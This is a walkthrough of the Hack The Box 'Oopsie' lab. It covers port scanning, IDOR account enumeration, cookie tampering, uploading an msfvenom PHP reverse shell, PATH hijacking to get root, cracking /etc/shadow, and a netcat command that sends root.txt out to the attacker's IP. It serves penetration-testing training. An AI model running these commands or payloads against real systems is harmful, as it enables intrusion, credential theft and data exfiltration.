# Oopsie
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313711-c9aeeed5-0662-495c-9091-d106cf3d0bd4.png)

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Parrot OS
* IP Address: 10.10.15.96

Victim:
* Name: victim_machine
* IP Address: 10.10.10.28
* Other information must be gathered during the attack

Phase 1: Enumeration
--
For first we collect information about victim_machine:

    $sudo nmap -sS -A 10.10.10.28 -vvv

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
    |   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
    |_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Welcome
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    
From these results we can suppose the target machine is a Linux machine (since we got "Ubuntu" string). From here, we can use some Nmap script to search for some vulnerabilities for OpenSSH 7.6p1 and Apache 2.4.29. This is out of target for this lab, but for completeness I will report it for gathering more useful information.

In Nmap we can use several vulnerability scan scripts, some of them can be caught from repositories like github. They are:
* vulscan: <https://github.com/scipag/vulscan>
    - Install: `sudo git clone https://github.com/scipag/vulscan /usr/share/nmap/scripts/vulscan`
* Nmap-vulners: <https://github.com/vulnersCom/nmap-vulners>
    - Install: `sudo git clone https://github.com/vulnersCom/nmap-vulners.git /usr/share/nmap/scripts/nmap-vulners`
* vuln (built-in in Nmap): <https://nmap.org/nsedoc/categories/vuln.html>

Note: **Nmap-vulners** and **vuln** are the same script as reported [here](https://github.com/vulnersCom/nmap-vulners).

We can combine the usage of these scripts in one command:

    $sudo nmap -sV --script=vulscan/vulscan.nse,vulners 10.10.10.28

The -sV argument is important to make these scripts aware of the services version to be assessed. The output of the scripts is organized based on each scanned open port.

Focusing on the scope of the lab, since 80/tcp port is opened, we can also get the header of the web server by using `curl`:

    $curl --head 10.10.10.28
    HTTP/1.1 200 OK
    Date: Wed, 07 Jul 2021 06:04:51 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Content-Type: text/html; charset=UTF-8

Try also to get more information by:

    $whatweb http://10.10.10.28
    
    http://10.10.10.28 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@megacorp.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.28], Script, Title[Welcome]

Let's check also which HTTP methods are allowed in a specific folder:

    $curl -X OPTIONS -I http://10.10.10.28/uploads/
    
    HTTP/1.1 200 OK
    Date: Wed, 07 Jul 2021 10:08:51 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Allow: GET,POST,OPTIONS,HEAD
    Content-Length: 0
    Content-Type: httpd/unix-directory


For first we can check if there is some vulnerability for this Apache version by using:

* searchsploit:
    - Install: `sudo git clone https://github.com/offensive-security/exploit-database.git /opt/exploit-database` then `sudo nano ~/.bash_aliases` and add `alias searchsploit='/opt/exploit-database/searchsploit'` and execute `source ~/.bash_aliases`
    - Update: `sudo searchsploit -u`
    - Usage: `searchsploit apache`

We can also use Nikto:

    $nikto -h http://10.10.10.28

Anyway, no big exploits for this version of Apache. At this point, we can visit this IP address by the browser:

![webpage](https://user-images.githubusercontent.com/83867734/124647949-e5651600-de96-11eb-9c7d-a0b1b9b42d75.png)

We need to search for interesting directories and files. For this task, we can look for Page Source, Burp Suite or different tools as:

* dirb
    - Install: `sudo apt-get install dirb`
    - Usage: `dirb http://10.10.10.28` (look at the options for tailoring the search)
    - Usage (wordlist "vuln"): `dirb http://10.10.10.28 /usr/share/dirb/vuln/<choose_a_txt>` (it will search for potentially vulnerabile files)
* dirbuster
    - Install: `sudo git clone https://gitlab.com/kalilinux/packages/dirbuster.git /opt/dirbuster` then `sudo nano ~/.bash_aliases` and add `alias dirbuster='source /opt/dirbuster/DirBuster-1.0-RC1.sh'` and execute `source ~/.bash_aliases`
    - Usage: `dirbuster`
* dirsearch
    - Install: `sudo git clone https://github.com/maurosoria/dirsearch /opt/dirsearch` then `sudo nano ~/.bash_aliases` and add `alias dirsearch='python3 /opt/dirsearch/dirsearch.py'` and `alias sudo='sudo '` and execute `source ~/.bash_aliases`
    - Usage: `dirsearch -u http://10.10.10.28 -e php` (i.e. search for .php file in the website folders)
* gobuster
    - Install: `sudo apt-get install gobuster`
    - Usage: `gobuster dir -u http://10.10.10.28/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` (look at the options for tailoring the search)

I suggest to add also the wordlists shown in this link: <https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content> and copy all these .txt in the /usr/share/wordlists/SecLists folder.

In case we would like to check any directories in the Page Source of the website, we can type the following command:

    $curl http://10.10.10.28 | grep -E --colour 'href|script'

In case we would like to check any directories by using Burpsuite, when we navigate to the <http://10.10.10.28>, our tool already is spidering the website, and we can see this information in "Target" -> "Site map" tab. We can see an interesting information: the login URL at <http://10.10.10.28/cdn-cgi/login/>. We found this evidence also by Nikto.

For performing successively the login, in general we could have several options. For example, by Burp Suite we note that login gives a POST request to index.php with username and password as data. At this point, we can try if it is prone to SQL Injection:

    $sqlmap http://10.10.10.28/cdn-cgi/login/ --data username=user:password=pass

Nothing injectable.
We could try for brute-forcing, but not value for the lab purpose.

In the page footer we note `admin@megacorp.com` and we already met this account in the Archetype lab. Thus, for accessing here, we can reuse the password got in the previous lab (Archetype) as admin.

Here an interesting section is "Upload" but we need "super admin" grants for accessing on it. The information to take this account is trying to search some useful information in other tabs, like "Account". Here we have our account object in a small table. In the URL <http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1> we can note there is an ["Insecure Direct Object References" (IDOR)](https://portswigger.net/web-security/access-control/idor) vulnerability because by changing the `id`, we can access to other account objects.

To enumerate all the object references in automated manner, instead to write manually the digits, we can use Burpsuite Intruder:

So, in "Proxy" -> "HTTP history" tab, right-click on [/cdn-cgi/login/admin.php?content=accounts&id=1](http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1) voice -> "Send to Intruder" -> move to "Intruder" tab:
* In "Target" tab, verify "host" and "port" values;
* In "Positions" tab, click on "Clear §" until all § are cleared. Then, add § only to id=1 as id=§1§ (NOTE: § is different from $)
    - §value§ is used to specify the variable that we want to change automatically with other values by the Intruder
* In "Payloads" tab, we can choose the way that variable must change
    - In "Payload Sets" set "Payload type" as "Numbers"
    - In "Payload Options set "From:" as 1, "To:" as 50, "Step:" as 1
* In "Options", in "Redirections", set "Follow redirections:" as "Always" and check "Process cookies in redirections".

Click on "Start attack".
A new window appears. To understand if we have a different result than empty one, we can check the "Length" value, if it is different from "3787". For each of the interesting results, we can click on "Response" -> "Render" tab and see the result in the embedded window. We can check also directly on the "Response" body.

Another option is to use `wfuzz` tool:
* wfuzz
    - Install: `sudo apt-get install wfuzz`
    - Usage: `wfuzz -c -z range,0-50 --hh 3595 -b role=admin -b user=34322 -u "http://10.10.10.28/cdn-cgi/login/admin.php?id=FUZZ&content=accounts"` (--hh 3595 means we hide the output containing 3595 that here corresponds to the size (number of chars) of the output, that are those responses with no account values)

The result of `wfuzz` is:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.28/cdn-cgi/login/admin.php?id=FUZZ&content=accounts
Total requests: 51

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000005:   200        160 L    321 W      3619 Ch     "4"            
000000002:   200        160 L    321 W      3623 Ch     "1"            
000000024:   200        160 L    321 W      3620 Ch     "23"           
000000014:   200        160 L    321 W      3621 Ch     "13"           
000000031:   200        160 L    322 W      3634 Ch     "30"           

Total time: 0
Processed Requests: 51
Filtered Requests: 46
Requests/sec.: 0
```

Analyzing all these results, we find out that the `id=30` is related to "super admin" user that is associated with 86575 value that seems a a format used on "cookie" value in our requests.

At this point, by enabling the intercept on Burp, click on "Uploads" tab on website, go back to Burp -> "Proxy" -> "Intercept" and change the "user" value of "Cookie" as "86575" and click "Forward.
If you want to avoid to inject each time this value in "name" and want to keep this cookie persistent for your session, open the Developer tools of your browser (by pressing F12), i.e. Firefox -> Storage -> under "Cookies" section click on "http://10.10.10.28", change "user" value with "86575". Click again on "Uploads" button of the webpage (remember to remove the "Intercept" by Burp).

Phase 2: Foothold
--
We gained access to the "Uploads" section. If the upload feature does not check for input files (for example don't implement user input validation), we can use it for uploading malicious files, i.e. reverse shell.

We can generate a reverse shell in different way. In this way, since we are on a PHP page (http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads), we should use a PHP webshell.
To do this, we have different options:
* Use webshell from /usr/share/webshells/ folder (for example php-reverse-shell.php) by changing its content with your attacker_machine IP and the PORT you want to listen on;
* Make a webshell by <https://www.revshells.com/> in PHP;
* Use msfvenom:
    - Non-Meterpreter Web Payloads:
        - asp: msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp
        - jsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp
        - war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war
        - php: msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php
    - Meterpreter Web Payloads:
        - asp: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp -o shell.asp
        - jsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp
        - war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war
        - php: msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php

In general, it is important for you understanding the differences between the several kinds of reverse shells, i.e. Non-Meterpreter or Meterpreter payloads, Staged or Stageless payloads, Bind or Reverse Shells, Encrypted Shells and so on.

In our exercise, set LHOST=10.10.15.96 (change with yours) LPORT=443
If you have ufw enabled, just add the following rule: `ufw allow from 10.10.10.28 proto tcp to any port 80,443`

For first, execute the listener (use netcat only for Non-Meterpreter reverse shell):
    $sudo nc -lvnp 443
    
Then, just upload the reverse shell in the website. Note that the host periodically clean what we upload, probably because this file is labelled as malicious (or because it is a "feature" of the exercise).
Immediately we can use dirsearch to understand where the reverse shell has been uploaded:

    $sudo dirsearch -u http://10.10.10.28 -e php
    
      _|. _ _  _  _  _ _|_    v0.4.2
      (_||| _) (/_(_|| (_| )

      Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8922

      Output File: /opt/dirsearch/reports/10.10.10.28/_21-07-07_06-47-24.txt

      Error Log: /opt/dirsearch/logs/errors-21-07-07_06-47-24.log

      Target: http://10.10.10.28/

      [06:47:24] Starting: 
      [06:47:27] 403 -  276B  - /.ht_wsr.txt
      [06:47:27] 403 -  276B  - /.htaccess.bak1
      [06:47:27] 403 -  276B  - /.htaccess.orig
      [06:47:27] 403 -  276B  - /.htaccess.sample
      [06:47:27] 403 -  276B  - /.htaccess.save
      [06:47:27] 403 -  276B  - /.htaccess_extra
      [06:47:27] 403 -  276B  - /.htaccess_orig
      [06:47:27] 403 -  276B  - /.htaccess_sc
      [06:47:27] 403 -  276B  - /.htaccessBAK
      [06:47:27] 403 -  276B  - /.htaccessOLD
      [06:47:27] 403 -  276B  - /.htaccessOLD2
      [06:47:27] 403 -  276B  - /.htm
      [06:47:27] 403 -  276B  - /.html
      [06:47:27] 403 -  276B  - /.htpasswd_test
      [06:47:27] 403 -  276B  - /.htpasswds
      [06:47:27] 403 -  276B  - /.httr-oauth
      [06:47:28] 403 -  276B  - /.php
      [06:47:34] 301 -  308B  - /css  ->  http://10.10.10.28/css/
      [06:47:35] 301 -  310B  - /fonts  ->  http://10.10.10.28/fonts/
      [06:47:35] 301 -  311B  - /images  ->  http://10.10.10.28/images/
      [06:47:35] 403 -  276B  - /images/
      [06:47:35] 200 -   11KB - /index.php
      [06:47:35] 200 -   11KB - /index.php/login/
      [06:47:36] 301 -  307B  - /js  ->  http://10.10.10.28/js/
      [06:47:36] 403 -  276B  - /js/
      [06:47:39] 403 -  276B  - /server-status
      [06:47:39] 403 -  276B  - /server-status/
      [06:47:40] 301 -  311B  - /themes  ->  http://10.10.10.28/themes/
      [06:47:40] 403 -  276B  - /themes/
      [06:47:40] 403 -  276B  - /uploads/
      [06:47:40] 301 -  312B  - /uploads  ->  http://10.10.10.28/uploads/

The interesting folder seems to be `/uploads/`.

When we uploaded the reverse shell, we need to trigger it. We can do this mainly in two manners:
* Visit http://10.10.10.28/uploads/shell.php
* Execute `curl http://10.10.10.28/uploads/shell.php`

If you receive a "Not Found" message, try to re-upload again because probably shell.php has been cleaned by the host.

    
Phase 3: Lateral Movement
--
Move to listener and check if it is connected with the victim machine. From here, try to surf folders and files for searching something of interesting. One nice file is `db.php` in `/var/www/html/cdn-cgi/login`. It contains `robert` credentials. We can use this credential to access to the host by ssh:
    
    ssh robert@10.10.10.28

If we move to `/home/robert/`, we can find the first flag.

Phase 4: Privilege Escalation
--
Now we need to escalate privileges. Usually, in a Linux machine, it is possible to execute commands on behalf of root user by using all those executable files with setuid enabled and that allow us to execute commands as our current user.
    
For identifying all the files with setuid enabled, we can execute:
    
    $find / -user root -perm -4000 2>/dev/null
    
or
    $find / -user root -perm -u=s 2>/dev/null   

NOTE: the usage of `2>/dev/null` does not show "Permission denied" errors.
By the results, we see `/usr/bin/bugtracker`. Furthermore, the id command reveals that robert is a member of the bugtracker group:
    
    robert@oopsie:~$ id
    uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
    
    robert@oopsie:~$ find / -type f -group bugtracker 2> /dev/null
    /usr/bin/bugtracker

So we can use bugtracker.
If we perform  `strings /usr/bin/bugtracker`, in the output we can see:

    ------------------
    : EV Bug Tracker :
    ------------------
    Provide Bug ID: 
    ---------------
    cat /root/reports/
    ;*3$"
    GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0


We can also use `ltrace` to see exactly what the calls do:
    robert@oopsie:~$ ltrace /usr/bin/bugtracker
    
And also from here, we can see more detailed the function that executes the `cat` command.This output shows also that, on the setuid line, setuid is setting the UID as 0 which is root. And doing an `ls -la` we can see the stickybit is set.
    
All this means we can exploit this `cat` command. Let's analyze for first the job of bugtracker:
    
    robert@oopsie:~$ /usr/bin/bugtracker

    ------------------
    : EV Bug Tracker :
    ------------------
    
    Provide Bug ID: 1
    ---------------
    
    Binary package hint: ev-engine-lib
    
    Version: 3.3.3-1
    
    Reproduce:
    When loading library in firmware it seems to be crashed
    
    What you expected to happen:
    Synchronized browsing to be enabled since it is enabled for that site.
    
    What happened instead:
    Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.


We can manage this scenario in several ways:
* Use `cat` command in bugtracker to reach the flag file:
    ```
    robert@oopsie:~$ bugtracker
    
    ------------------
    : EV Bug Tracker :
    ------------------
    
    Provide Bug ID: ../root.txt
    ```

* Hijacking the `PATH` environment variable and execute a shell by creating a malicious cat binary (more elegant and efficient solution):
    ```
    robert@oopsie:~$ export PATH=/tmp:$PATH
    robert@oopsie:~$ cd /tmp/
    robert@oopsie:/tmp$ echo '/bin/sh' > cat
    robert@oopsie:/tmp$ chmod +x cat
    robert@oopsie:/tmp$ cd
    robert@oopsie:~$ bugtracker 
    
    ------------------
    : EV Bug Tracker :
    ------------------
    
    Provide Bug ID: 2
    ---------------
    
    # whoami
    root
    # 
    ```

PS: if the current terminal does not allow you to execute previous commands when you press "up" key, just type `su`.
    
What did we in the second choice? We know that bugtracker tool uses `cat` command, that is called from /bin/ folder. We can change `cat` instructions but we don't have enough permissions to modify `cat`. From the terminal, you can call `cat` command directly without specifying the path because `/bin/` folder is set inside the `PATH` environment variable. What does it happen if we have the same command in more than one paths specified in `PATH`? Linux should use the command from the first path inside `PATH` environment variable. So, in this case, we can make a custom `cat` command file, for example containing `/bin/sh`, set at the beginning of `PATH` environment variable the path of this custom `cat` command by executing `export PATH=/ourpath:$PATH`, give to the custom command file the executable (`+x`) grant and then, when we execute the `cat` command, the system will refer to the custom `cat` command file inside our custom path.
    
Post-Exploitation
--
Now we can also pull the shadow file (/etc/shadow) for passwords and look around for credentials if needed, i.e. when you read the reports in the /root/reports you will see many references to the filezilla and its config. Indeed, by searching on `/root/.config/filezilla/` directory (out of scope for this lab).
If we pull the shadow file, we can use `john --wordlist=/usr/share/wordists/rockyou.txt shadow.txt` for trying to crack root password (in this case, rockyou wordlist does not work).
    
Since we have also the DB credentials, we can check if in the database could be some useful information:
    
    $mysql -p
    
Insert robert password.
    
    mysql> use garage
    mysql> show databases;
    mysql> show tables;

Let's try to catch some password:
    
    mysql> select user,authentication_string from mysql.user;
    
and check it on [CrackStation](https://crackstation.net/).
    
Source: <https://blog.cyberethical.me/htb-starting-point-oopsie> (read also "Arbitrary Library Injection", could be interesting if maybe here does not work)
 
Misc
--
    
In the case we are not able to read the output of the commands from the victim_machine by using cat, nano, vi and so on, we can exfiltrate data by netcat. For example:

* On the attacker_machine: `nc -l -p 443 > root.txt`
* On the victim_machine: `nc -w 3 10.10.15.96 443 < root.txt`
                                                             
In this way, we get the `root.txt` file on our machine.

In general, after all these operations, it is best practice to remove the /tmp folder from the PATH to use the correct cat command, to restore the original "state" of the system before our attack.
                                                             
Save in a file all the credentials you gather, maybe could be useful in the next labs.                                                           
